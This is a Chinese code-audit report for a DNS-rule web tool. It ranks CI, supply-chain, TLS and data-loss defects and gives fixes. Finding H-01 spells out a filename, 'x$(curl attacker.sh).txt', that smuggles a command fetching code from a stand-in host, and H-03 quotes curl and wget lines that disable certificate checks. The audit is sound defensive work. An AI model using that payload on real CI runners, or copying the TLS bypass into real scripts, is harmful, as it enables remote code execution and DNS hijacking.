# v3.19.0 代码审查汇总报告

> 审查日期：2026-11-18 · 基准版本：`package.json` = 3.19.0
> 方式：三路只读审查（安全 / 缺陷 / 架构），交叉更正后由主审对**全部高危与阻断项**逐一读码 + 实跑命令复核。
> 性质：**只读**——未修改任何源码/配置。工作区原有的未提交改动（见文末）未被触碰。

---

## 一、结论速览

| 级别 | 数量 | 一句话概括 |
|---|---|---|
| 🔴 BLOCKER | 1 | 锁文件缺失 → CI 在 setup 步硬失败，全流水线不可用 |
| 🟠 HIGH | 5 | CI 命令注入、fork PR 投毒发版、路由器脚本关闭 TLS、草稿静默丢失、engine 约束失效 |
| 🟡 MEDIUM | 16 | CSP/出网/缓存校验/供应链/令牌、IPv6 校验、进度与内存、重复实现与性能 |
| 🔵 LOW | 12 | 文案/版本头/无障碍细节、CSS 顺序、统计口径、注入 sink 兜底 |

**关键反差**：本地 6 项门禁全绿（tsc 0 错、ESLint 0 warning、Vitest 51 套件/326 用例、check-locales 16 语 212 键、sync-facts 13 处一致、root-clean 通过），但这些是用**已存在的 `node_modules`** 跑出来的，恰好掩盖了 BLOCKER——CI 在 `pnpm install --frozen-lockfile` 之前就会退出，根本到不了这些门禁。

---

## 二、🔴 BLOCKER

### B-01 锁文件与 `.npmrc` 缺失，CI 在 setup 步必然失败
- **位置**：`pnpm-lock.yaml` / `.npmrc` 均不在工作树，也不在 `HEAD`（提交 `e102610` 同批删除）；`.github/actions/setup/action.yml:68-70`
- **证据**：`setup/action.yml:78` 用 `pnpm install --frozen-lockfile`，而 `:68-70` 在缺锁文件且 `install=true && frozen=true` 时 `exit 1`。受影响：ci.yml 的 lint/typecheck/test/build 与 deploy.yml 两个部署 job（均默认 `install:true`）。不受影响：release.yml:61-63 与 ci.yml 的 rootclean/data（`install:'false'`）。
- **残留误导**：`.gitignore:63` 注释「pnpm-lock.yaml 必须入库」、setup/action.yml:11-12/60/68-69/88、ci.yml:150 的 `hashFiles`、`dependabot.yml:18` 仍声称锁文件存在。
- **修复**：本地 `pnpm install` 重新生成并提交 `pnpm-lock.yaml`；恢复 `.npmrc`（`engine-strict=true` / `package-manager-strict=true`）；`node-version` 从 `'24'` 固定为 `24.11.0`，修正 setup 注释第 3/5 条。

---

## 三、🟠 HIGH

### H-01 CI 命令注入（fork PR 可在 runner 上执行任意命令）
- `scripts/check-root-clean.mjs:41` `cp.execSync(\`git check-ignore -q ${JSON.stringify(rel)}\`)`；文件名直接来自 `:61 readdirSync(ROOT)`。fork PR 提交根级文件 `x$(curl attacker.sh).txt` → `ci.yml:66-67` 在 `pull_request` 事件执行 → RCE。
- **精确范围**：空格/引号/普通反斜杠被 `JSON.stringify`+shell 双引号正确处理；真正危险的是 `$(...)`/反引号（双引号内仍展开）与换行/制表符（控制字符不还原 → 门禁误报）。
- **修复**：`cp.execFileSync('git', ['check-ignore', '-q', '--', rel], { cwd: ROOT, stdio: 'ignore' })`。

### H-02 `workflow_run` 投毒：fork PR 可带着 secrets 部署/发版
- `deploy.yml:29/62/70/119`、`release.yml:29/58`。fork PR 把源分支命名为 `main` → `workflow_run.branches:[main]` 按 head_branch 通过 → 检出 `head_sha` 并执行其中的 `./.github/actions/setup`、`pnpm run build`，`vercel deploy --prebuilt` 把攻击者产物发到生产，`secrets.VERCEL_TOKEN`/`EDGEONE_API_TOKEN` 同 job 内可用；`release.yml:35 permissions: contents: write` 同样受影响。
- **修复**：job 增加 `github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.event == 'push'`；密钥放受保护 environment，仅 push 触发时暴露；绝不检出并执行 head_sha 的脚本。

### H-03 生成的路由器脚本关闭 TLS 校验（MITM → 全网 DNS 劫持）
- `src/utils/scriptGenerator.ts:41,43,45,75,96,115`：`curl -s -k` / `wget --no-check-certificate` / `uclient-fetch --no-check-certificate`。脚本以 root 运行，下载内容经 `:52 mv` 覆盖 `/etc/dnsmasq.d/dns-shield.conf` 并重启 dnsmasq。对照：pihole 分支 `:133` **没有** `-k`，证明其余分支是有意降级。
- **修复**：去掉 `-k`/`--no-check-certificate`，依赖系统 CA（OpenWrt 装 `ca-bundle`）。注：`shellQuote`（`:14`）本身正确，URL 命令注入不成立。

### H-04 自动保存静默丢数据 + 假成功提示
- `src/hooks/autosaveStorage.ts:97-109`：IDB 写入失败时，若草稿 > 5,000,000 字符，`isLegacyValid` 为 false → 既不写 IDB 也不写 localStorage、不抛错、不返回失败标志。30s 定时保存（useAutosave.ts:61-65）同样静默失败。
- `src/hooks/useDomainData.ts:171-173`：`void writeAutosave(...)` 不 await，无条件 `showToast('domainsSaved')`。
- **修复**：`writeAutosave` 返回 boolean/结果对象；失败向上传播并弹失败 toast；>5MB 且 IDB 不可用时明确告警。

### H-05 `.npmrc` 删除，engine 强约束失效（与 B-01 同根，见其修复）
- `.github/actions/setup/action.yml:9-10` 注释仍称 `engine-strict=true` 生效，实际 node-version 是松散 `'24'`；本地与 CI 均不再阻断 Node<24.11 或 pnpm≠11.24.0。

---

## 四、🟡 MEDIUM（16）

### 安全 / 供应链
- **M-01 CSP 生产常开 `unsafe-inline`**：`next.config.js:16` `script-src` 含 `'unsafe-inline'`（`:17/:18` img-src/style-src 亦过宽）；layout.tsx:37/43 与 ga-scripts.tsx:20 三处内联注入点失去 CSP 缓解。**注意**：`'unsafe-eval'` 仅 dev 放行是正面项，与此不冲突，勿合并删除。修：nonce 或 SHA-256 hash 白名单；收窄 img-src/connect-src。
- **M-02 任意 host 出站 + `connect-src https:` 放开全部 HTTPS**：`src/utils/fileUtils.ts:14` 只校验协议，允许 `http://127.0.0.1`/`169.254.169.254`；`next.config.js:20`。已核实全部 fetch 在 `'use client'` 树内、**非服务端 SSRF**，属客户端请求伪造面。修：强制 https + 内置源域名白名单 + 自定义源显式确认；connect-src 收窄到实际源。
- **M-03 IndexedDB 缓存零运行时校验**：`idb.ts:55` `as T` 仅编译期断言；`httpCache.ts`/`cachedFetch.ts` 无类型守卫/TTL。同源 XSS 或扩展可写 `{text:对象, etag:任意}` 污染规则正文与 `If-None-Match`。修：读取时类型守卫 + etag 正则 + TTL。
- **M-04 第三方 Action 未固定到 commit SHA**（= sec #7 + arch Actions 条，**合并**）：ci.yml:60/127/146、setup/action.yml:42/45/57、deploy.yml:67/135、aggregate.yml:59 用可变 major tag；`dependabot.yml:2`「刻意钉死」措辞夸大，`:9-11` weekly 主动推进。修：`uses: actions/checkout@<40位SHA> # v5.x.x` + Dependabot 推进 SHA。
- **M-05 部署令牌进入 argv**：deploy.yml:75/84/86/96/98（Vercel）、:135（EdgeOne）token 出现在 `/proc/<pid>/cmdline`，可被同 job 不可信构建脚本（见 H-02）窃取。修：步骤级 `env:` 传值 + 命令引用 `"$TOKEN"`；优先 OIDC。

### 正确性 / 大输入（主题归组，条目独立）
- **M-06 IPv6 正则拒绝大量合法地址**：`src/utils/domainPrimitives.ts:10`。**Node 实测**：`2001:db8::8a2e:370:7334`、`fe80::abcd:1234`、`::`、`::ffff:192.168.1.1` 全 REJECTED（`::1`/全展开式通过）；hosts 行与 `@domain=DNS` 行被误判为无效而丢弃。修：按 `::` 拆分组数 + 支持内嵌 IPv4。
- **M-07 并行分支从不 `setIsProcessing(true)`**：`useRuleWorker.ts:121-144`（唯一调用在 `:171` 串行分支，`:135` 用 `pendingRef.size>0` 通常 false）；≥20000 行时 InputPanel.tsx:122 的进度条整体不渲染。修：并行入口置 true，完成/失败统一置 false。
- **M-08 IDB 连接失败被永久缓存**：`idb.ts:22/39-40`，一次 `onerror`/`onblocked` → `dbPromise` 永久 resolve(null)，整会话降级 localStorage，与 H-04 叠加放大丢数据。修：失败时重置 `dbPromise=null` 并区分 `onerror`/`onblocked`。
- **M-09 Worker 聚合进度 total 口径错误**：`useWorkerPool.ts:44-50` `total += shard.total` 是已上报分片之和而非全局行数 → 进度可到 100% 后倒退（当前被 M-07 掩盖）。修：派发前算固定全局 total，progress 只累加 processed。
- **M-10 `push(...arr)` 展开上限致并行静默降级**（= bug #8 + arch #3，**合并**）：`parseAggregate.ts:47-50`。**Node 实测**：125000 元素 OK，**126000 起 RangeError** → `workerPoolFinalize.ts` catch 后仅 warn 返回 null → 二次 postMessage 整块文本（内存翻倍）、无用户可见反馈地退化为串行。触发门槛通常 >~100 万行。修：`for (const d of part.raw.domains) raw.domains.push(d)` 或 `concat`。
- **M-11 单飞只挡重复调用，不取消已派发分片 + 迟到终态误扣负载**（bug #11）：`useWorkerPool.ts:56-57`（`loadRef -=1` 在 `if(!task) return` **之前**）、`:123-126`（作废只 delete+resolve）、`:154-159`（分片已 postMessage）。后果：① stale 分片副本滞留 Worker FIFO 被完整计算，连续编辑大文本线性堆积（与 M-10 同主题）；② 旧任务迟到终态扣的是新任务刚 `+1` 的 load，`Math.max(0,…)` 钳到 0 → 「最闲优先」失真（纯静态可证）。修：作废时 `terminateAll()` 重建池，或按 taskId 分代记账 + cancelledTaskIds 早退不扣 load。

### 架构 / 性能
- **M-12 AppContext 每次渲染新 value**：`Home.tsx:20 <AppProvider value={{t:c.t}}>` → 13 个 `useT()` 消费者全量重渲染。修：`useMemo(()=>({t:c.t}),[c.t])`。
- **M-13 覆盖率门禁盲区**：`vitest.config.ts:23 all:false` + `:25 include` 仅 utils/hooks → `cachedFetch.ts`/`httpCache.ts` 及 app/components/config/workers 共 ~51 文件不计入；functions 余量仅 3.23。（`all:false` 本身是为避免未 import 文件按 0% 误判，须保留，改进应靠补测+exclude。）修：补缓存层测试，按 glob 分设 thresholds。
- **M-14 版本三处重复、两处不被门禁覆盖**：`package.json:3` / `next.config.js:77`（死配置，`process.env.version` 零引用）/ `src/config/version.ts:5`（运行时真源，6+ 处引用）；`sync-facts.mjs:18-32` RULES 不含后两者。**当前值均为 3.19.0，无已发生漂移**。修：`expect(APP_VERSION).toBe(pkg.version)` 或纳入 sync-facts。
- **M-15 规则行/头部 3+2 份重复实现**：`formatGenerators.ts` / `formatGenerators.single.ts`（运行时） / `scripts/lib/formatRules.mjs`（构建） + 头部 2 份；`generateRules`+`formatGenerators.ts` 仅测试引用，生产为死代码。修：抽框架无关纯 TS 模块共用。
- **M-16 同步全量生成 + 重复行数扫描**：`useRules.ts:44` 同步生成、`:59` 与 `:33-35` 各算一次 `generateLineNumbers`；`formatGenerators.single.ts:171-176` 用 `out +=` 拼多 MB 字符串。修：数组 push+join、去重调用、大输入移入 Worker。
- **M-17 3 个零引用依赖**：`package.json:25-27` `@radix-ui/react-{switch,tabs,toast}`（toast 实际用 sonner）。修：移除并重生锁文件。

---

## 五、🔵 LOW（12）

| ID | 问题 | 位置 / 修复 |
|---|---|---|
| L-01 | `${{ vars.* }}`/`inputs.*` 直插 shell | deploy.yml:133-136、ci.yml:109 → 走 `env:` |
| L-02 | 聚合脚本 fetch 无体积上限、重定向不校验 | aggregate-upstream.mjs:60/65 → `redirect:'manual'` + 流式上限 |
| L-03 | 首屏内联脚本 `lang` 无枚举校验（与 useLanguage 白名单不一致，**非 XSS**） | layout.tsx:37 → 共用白名单 |
| L-04 | JSON-LD `JSON.stringify` 未转义 `<`（当前全静态常量，不可利用） | layout.tsx:43 → `.replace(/</g,'\\u003c')` |
| L-05 | autosave 恢复竞态覆盖用户已输入内容 | useAutosave.ts:34-56 → 检查 ref 非空 + 跳过空白草稿 |
| L-06 | 空输入 `totalLines=1`（`''.split('\n')`） | parser.ts:33/115、lineCount.ts:12 → 空串返回 0 |
| L-07 | 构建产物白名单注释 vs 运行时 i18n（zh-cn 默认语言下 label/hostsNote 已不一致） | formatRules.mjs:85/94/95 vs zh-cn.json:134-135；仅注释行，不影响功能 |
| L-08 | APP_VERSION 一致性无自动校验（**当前一致，结构性缺失**） | version.ts:5 vs package.json:3；加断言断言或纳入 sync-facts |
| L-09 | 非 src 配置版本头陈旧 + vitest 实测数字不符 | vitest.config.ts:1/33、sync-facts.mjs:1 等 |
| L-10 | 9 个 CSS import 靠顺序即级联（分层规则下不严谨）+ 预览样式错位在 input.css | layout.tsx:8-16 → 具名 @layer / 归位 output.css |
| L-11 | `.gitignore` 重复条目 | :14/:42、:24/:43 等 → 去重 |
| L-12 | `useVirtualList` 滚动无 rAF 节流 | useVirtualList.ts:34 → rAF 合并 |

> arch #14 的 `filteredCustomDns`「命名误导」经 bug-hunter 核实为**语义等价、非缺陷**，未计入。

---

## 六、汇总去重与定级裁决（三代理多轮交叉更正后）

1. **合并条**：「第三方 Action 未固定 SHA」= sec #7 + arch 的 Actions 条，统一 MEDIUM（双方一致）。**编号撞车提醒**：arch 的 Actions 条与 bug-hunter 正式 #11（Worker 池）是两个完全不同的问题，按主题区分，勿按数字合并。
2. **APP_VERSION 定级**：arch MEDIUM vs bug-hunter LOW → **采用 LOW**。当前三处值一致，能证明的只是结构性保障缺失；「bump 必然漏改」属未来流程推测，遵循「不可从代码证明则不升级」。
3. **大输入主题归组但条目独立**：M-10（push 展开）与 M-11（stale 分片/loadRef）根因与修复不同，均保留。
4. **不作为缺陷**：`vercel.json`（已删、next.config.js:3 注释如实、白名单残留条目永不生效）；真实漂移已由 `docs/tasks.md:57-60` T-DOC-01 追踪。
5. **不删 M-01**：CSP `unsafe-inline` 风险与 `unsafe-eval` 仅 dev 的正面项不矛盾。
6. `.env.local` 含真实 GA ID：未入库、GA measurement ID 属公开标识非 secret；仅违反本地纪律，建议改占位值（信息性附注）。

---

## 七、测试覆盖缺口
- 无 `useRuleWorker.test.ts` / 两个 worker 消息处理器测试 → M-07/M-09/M-11 无兜底。
- 无 `autosaveStorage.test.ts` / `idb.test.ts` / `useAutosave.test.ts`（useDomainData.autosave.test.ts 整体 mock）→ H-04/M-08 无兜底。
- `parseAggregate.test.ts` 样本仅 30/50/97 行 → M-10 无兜底。
- 无 `formatRules.mjs`/`gen-format-files.mjs` 单测，CI drift 只比对产物自洽 → M-15/L-07 无兜底。
- 无 `APP_VERSION` vs package.json 断言 → M-14/L-08 无兜底。
- 压缩/映射型 IPv6 未测 → M-06 无兜底。

---

## 八、已验证优势（真实核对，非推测）
1. `shellQuote` 单引号转义正确；GA ID 严格正则校验 + 源码无硬编码；双层 10MB 流式体积上限 + 50MB 总量 + 10s 超时；`sanitizeFilename` 无路径遍历。
2. 本地存储校验到位（时间戳 `/^\d+$/`、语言/主题白名单、category Map、i18n deepMerge 无原型污染）。
3. Worker 同源专用；全库无动态 `new RegExp`/`eval`/`new Function`；无 ReDoS。
4. 安全响应头齐全（HSTS/COOP/CORP/X-Frame-Options/frame-ancestors/object-src/base-uri/Permissions-Policy）。
5. 无 >200 行源文件（176 文件实扫）；单一数据源（version.ts 展示位 8 处、sync-facts 13 处门禁、defaults.json 双端共用、产物清单单一来源）。
6. CLI 版本钉死（vercel 62.2.0 / edgeone 1.6.41）、concurrency 防并发、release 资产清单脚本化。
7. **Worker 池分工方向正确，但** M-11 的 (a) 旧分片滞留 + (b) 迟到终态误扣负载削弱了这一优势。

---

## 九、建议修复顺序
1. **立即**：B-01（锁文件 + .npmrc）→ 恢复 CI；H-01/H-02（CI 注入 + 投毒）→ 堵供应链；H-03（TLS）→ 堵全网劫持。
2. **本迭代**：H-04/L-05（草稿不丢）、M-06/M-07/M-08/M-09/M-10/M-11（大输入正确性）、M-04/M-05（供应链/令牌）。
3. **后续**：M-01/M-02/M-03（安全纵深）、M-12~M-17（架构/性能）、LOW 全组。
4. 修复时按各条「测试覆盖缺口」补回归用例，并依 SPEC §5.3 登记进 [`docs/tasks.md`](./tasks.md)。本报告为 v3.19.0 冻结快照、不维护任务状态；报告中的未闭环项已统一迁移至该文档 §二 / §六，数量与状态以 `tasks.md` 实时声明为准。

---

## 十、工作区状态（未触碰）
审查期间工作区已有未提交改动：`.github/workflows/aggregate.yml`、`.github/workflows/release.yml`、`CHANGELOG.md`（已修改），`.github/dependabot.yml`（未跟踪）。本报告为新增独立文档；所有源码/配置保持审查前原样。
